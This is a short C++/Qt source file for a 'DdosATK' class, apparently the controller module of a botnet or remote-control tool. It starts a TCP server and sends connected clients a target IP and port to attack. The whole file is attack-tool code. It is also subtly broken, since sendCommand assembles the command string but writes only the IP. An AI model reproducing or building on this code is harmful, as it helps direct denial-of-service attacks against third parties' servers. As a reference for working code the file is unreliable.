#include "ddosatk.h"

DdosATK::DdosATK(QWidget *parent) : QWidget(parent), mSock(nullptr)
{

}

int DdosATK::startDdosATKServer()
{
    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启DDOS服务失败";
        deleteLater();
        return -1;
    }

    return mServer->server()->serverPort();
}

void DdosATK::sendCommand(QString IP,int PORT)
{
    if (mSock) {
        QString data;
        data.append("IP"+IP+CmdSplit);
        data.append("PORT"+QString::number(PORT));
        data.append(CmdEnd);
        mSock->write(codec->fromUnicode(IP));
    }
}
